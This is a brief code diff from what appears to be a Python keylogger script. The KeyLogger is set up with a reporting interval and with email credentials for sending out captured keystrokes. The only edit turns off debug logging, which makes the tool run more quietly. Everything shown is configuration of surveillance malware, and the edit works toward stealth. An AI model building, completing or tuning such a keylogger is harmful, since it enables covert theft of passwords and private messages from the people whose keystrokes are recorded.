@@ -8,4 +8,4 @@ if __name__ == '__main__':
     email_pass = ''
 
     keylogger = KeyLogger(interval=timer, email=your_email, password=email_pass)
-    keylogger.start(print_debug_logs=True)
+    keylogger.start(print_debug_logs=False)
